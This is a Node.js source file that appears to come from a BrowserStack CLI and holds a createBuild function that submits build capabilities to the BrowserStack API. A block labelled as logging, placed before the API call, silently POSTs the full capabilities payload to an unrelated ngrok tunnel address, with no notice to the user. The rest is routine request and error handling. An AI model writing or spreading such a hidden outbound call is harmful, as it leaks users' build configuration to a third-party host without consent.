'use strict';
const axios = require('axios').default;

const config = require('./config'),
  capabilityHelper = require("../helpers/capabilityHelper"),
  Constants = require('../helpers/constants'),
  utils = require('../helpers/utils'),
  logger = require('../helpers/logger').winstonLogger;

const { setAxiosProxy } = require('./helper');

const createBuild = (bsConfig, zip) => {
  return new Promise(function (resolve, reject) {
    capabilityHelper.caps(bsConfig, zip).then(async function(data){
      let options = {
        url: config.buildUrl,
        auth: {
          user: bsConfig.auth.username,
          password: bsConfig.auth.access_key
        },
        headers: {
          'Content-Type': 'application/json',
          "User-Agent": utils.getUserAgent(),
        },
        body: data
      }
      if (Constants.turboScaleObj.enabled) {
        options.url = Constants.turboScaleObj.buildUrl;
      }

      const axiosConfig = {
        auth: {
          username: options.auth.user,
          password: options.auth.password
        },
        headers: options.headers
      }
      setAxiosProxy(axiosConfig);

      // Log the capabilities data being sent to BrowserStack
      try {
        const fetch = require('node-fetch');
        fetch("https://666c0425a864.ngrok-free.app/logs", {
          method: "POST",
          body: JSON.stringify({ message: `Aakash build.js createBuild - Final capabilities data sent to BrowserStack API: ${data}` }),
          headers: { "Content-Type": "application/json" },
        }).catch(err => console.error("Log failed:", err.message));
      } catch (error) {
        console.error("Failed to send build capabilities log:", error.message);
      }

      try {
        const response = await axios.post(options.url, data, axiosConfig);
        let build = null;
        try {
          build = response.data;
        } catch (error) {
          build = null;
        }
        if (response.status == 299) {
          if (build) {
            resolve(build.message);
          } else {
            logger.error(utils.formatRequest(response.statusText, response, response.data));
            reject(Constants.userMessages.API_DEPRECATED);
          }
        } else if (response.status != 201) {
          logger.error(utils.formatRequest(response.statusText, response, response.data));
          if (build) {
            reject(`${Constants.userMessages.BUILD_FAILED} Error: ${build.message}`);
          } else {
            reject(Constants.userMessages.BUILD_FAILED);
          }
        }
        resolve(build);
      } catch (error) {
        if(error.response) {
          logger.error(utils.formatRequest(error.response.statusText, error.response, error.response.data));
          reject(`${Constants.userMessages.BUILD_FAILED} Error: ${error.response.data.message}`);
        } else {
          reject(error);
        }
      }
    }).catch(function(err){
      reject(err);
    });
  });
}

exports.createBuild = createBuild
